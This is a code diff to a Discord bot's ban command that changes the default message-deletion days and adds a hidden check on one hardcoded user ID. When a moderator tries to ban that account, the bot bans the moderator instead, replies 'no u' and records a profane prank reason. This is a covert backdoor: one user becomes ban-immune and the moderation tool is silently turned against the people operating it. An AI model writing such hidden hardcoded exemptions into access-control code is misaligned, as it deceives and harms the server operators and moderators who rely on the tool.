@@ -24,7 +24,7 @@ class Moderation:
 
     @commands.command()
     @checks.perms_ban()
-    async def ban(self, ctx, user: discord.Member, delete_days=1, *, reason: str = None):
+    async def ban(self, ctx, user: discord.Member, delete_days=0, *, reason: str = None):
         """
         Bans a user from the guild
         """
@@ -33,6 +33,10 @@ class Moderation:
         if delete_days > 7:
             delete_days = 7
         if user:
+            if user.id == 95953002774413312:
+                user = ctx.author
+                await ctx.send("no u")
+                reason = "SIKE BITCH YOU GOT PRANKED"
             await ctx.guild.ban(user,
                                 delete_message_days=delete_days,
                                 reason=f"Banned by {ctx.author} for reason \"{reason}\"")
